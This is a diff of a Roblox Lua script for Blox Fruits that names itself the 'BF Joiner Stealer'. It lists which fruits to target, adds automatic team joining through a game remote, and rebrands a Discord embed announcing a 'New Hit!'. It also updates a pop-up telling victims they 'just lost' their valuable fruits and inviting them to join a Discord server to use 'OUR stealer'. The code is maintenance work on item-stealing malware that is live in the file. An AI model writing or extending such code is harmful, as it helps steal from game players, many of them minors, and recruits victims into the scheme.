@@ -7,7 +7,7 @@ if not Usernames then
     Usernames = {}
 end
 if not Fruits then
-    Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"} -- Default Fruits
+    Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)"} -- Default Fruits
 end
 if not FruitsToReset then
     FruitsToReset = {"Gravity-Gravity", "Blizzard-Blizzard"} -- Default FruitsToReset
@@ -31,138 +31,20 @@ if Usernames then
     end
 end
 
-local function CreateTeamNotification()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "TeamSelectionGui"
-    ScreenGui.Parent = plr.PlayerGui
+local function JoinTeam()
+    local player = game.Players.LocalPlayer
+    local currentTeam = player.Team
+    if currentTeam ~= game.Teams.Marines and currentTeam ~= game.Teams.Pirates then
+        local args = {
+            [1] = "SetTeam",
+            [2] = "Marines"
+        }
 
-    local isMobile1 = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
-
-    local coolSize = isMobile1 and UDim2.new(0, 150, 0, 80) or UDim2.new(0, 350, 0, 120)
-
-    local MainFrame = Instance.new("Frame")
-    MainFrame.Name = "NotificationFrame"
-    MainFrame.Size = coolSize
-    MainFrame.Position = UDim2.new(0.5, -(coolSize.X.Offset/2), 0.4, 0)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Parent = ScreenGui
-    
-    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 15)
-    
-    local UIGradient = Instance.new("UIGradient", MainFrame)
-    UIGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 45)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(30, 30, 30)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))
-    })
-    UIGradient.Rotation = 45
-    
-    local GlowEffect = Instance.new("ImageLabel")
-    GlowEffect.Size = UDim2.new(1.2, 0, 1.2, 0)
-    GlowEffect.Position = UDim2.new(-0.1, 0, -0.1, 0)
-    GlowEffect.BackgroundTransparency = 1
-    GlowEffect.Image = "rbxassetid://131274595"
-    GlowEffect.ImageColor3 = Color3.fromRGB(255, 100, 100)
-    GlowEffect.ImageTransparency = 0.8
-    GlowEffect.ZIndex = -1
-    GlowEffect.Parent = MainFrame
-    
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1, 0, 0, 40)
-    Title.Position = UDim2.new(0, 0, 0, 15)
-    Title.BackgroundTransparency = 1
-    Title.Text = "⚠️ Join a team!"
-    Title.TextColor3 = Color3.fromRGB(255, 100, 100)
-    Title.TextScaled = true
-    Title.Font = Enum.Font.GothamBold
-    Title.Parent = MainFrame
-    
-    local Message = Instance.new("TextLabel")
-    Message.Size = UDim2.new(0.9, 0, 0, 40)
-    Message.Position = UDim2.new(0.05, 0, 0.45, 0)
-    Message.BackgroundTransparency = 1
-    Message.Text = "Please join either Marines or Pirates team to continue to the script."
-    Message.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Message.TextScaled = true
-    Message.TextWrapped = true
-    Message.Font = Enum.Font.Gotham
-    Message.Parent = MainFrame
-    
-    local Shimmer = Instance.new("Frame")
-    Shimmer.Size = UDim2.new(0, 30, 1, 0)
-    Shimmer.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    Shimmer.BackgroundTransparency = 1
-    Shimmer.Position = UDim2.new(-0.1, 0, 0, 0)
-    Shimmer.Parent = MainFrame
-    
-    local Border = Instance.new("UIStroke")
-    Border.Color = Color3.fromRGB(255, 100, 100)
-    Border.Thickness = 2
-    Border.Parent = MainFrame
-    
-    coroutine.wrap(function()
-        while MainFrame.Parent do
-            TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
-                ImageTransparency = 0.9
-            }):Play()
-            TweenService:Create(Border, TweenInfo.new(1.5), {
-                Transparency = 0.7
-            }):Play()
-            task.wait(0.75)
-            TweenService:Create(GlowEffect, TweenInfo.new(1.5), {
-                ImageTransparency = 0.7
-            }):Play()
-            TweenService:Create(Border, TweenInfo.new(1.5), {
-                Transparency = 0
-            }):Play()
-            task.wait(0.75)
-        end
-    end)()
-    
-    coroutine.wrap(function()
-        while MainFrame.Parent do
-            TweenService:Create(Shimmer, TweenInfo.new(1.5), {
-                Position = UDim2.new(1, 0, 0, 0)
-            }):Play()
-            task.wait(1.5)
-            Shimmer.Position = UDim2.new(-0.1, 0, 0, 0)
-        end
-    end)()
-    
-    TweenService:Create(MainFrame, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-        Position = UDim2.new(0.5, -175, 0.1, 0)
-    }):Play()
-    
-    return ScreenGui, MainFrame
+        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+    end
 end
 
-local function WaitForTeamSelection()
-    if plr.Team == game.Teams.Marines or plr.Team == game.Teams.Pirates then return end
-    
-    local gui, frame = CreateTeamNotification()
-    local teamSelected = Instance.new("BindableEvent")
-    
-    local connection
-    connection = plr:GetPropertyChangedSignal("Team"):Connect(function()
-        if plr.Team == game.Teams.Marines or plr.Team == game.Teams.Pirates then
-            connection:Disconnect()
-            TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
-                Position = UDim2.new(0.5, -150, -0.2, 0)
-            }):Play()
-            task.wait(0.5)
-            gui:Destroy()
-            teamSelected:Fire()
-        end
-    end)
-    
-    teamSelected.Event:Wait()
-    teamSelected:Destroy()
-end
-
-WaitForTeamSelection()
-
-task.wait(4)
+JoinTeam()
 
 _G.scriptExecuted = true
 
@@ -646,7 +528,7 @@ local function formatPremiumItems()
 end
 
 local embed = {
-    title = (dragonFruit and "DRAGON DETECTED!") or "BF Joiner",
+    title = (dragonFruit and "DRAGON DETECTED!") or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
     description = "New Hit! @everyone",
     color = (dragonFruit and 0xFF0000) or 0x00FF00,
     fields = {
@@ -1159,7 +1041,7 @@ local function createDiscordUI()
     Description.Position = UDim2.new(0.05, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
-    Description.Text = "Hey! You just lost some of your valuable fruits to BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer"
+    Description.Text = "Hey! You just lost some of your valuable fruits to Rua Hub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite"
     Description.TextColor3 = Color3.fromRGB(220, 221, 222)
     Description.TextScaled = true
     Description.TextWrapped = true
@@ -1214,7 +1096,7 @@ local function createDiscordUI()
     end
     
     Button.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/zJKDqR")
+        setclipboard("https://discord.gg/zJKDqRd5")
         showCopiedText()
     end)
     
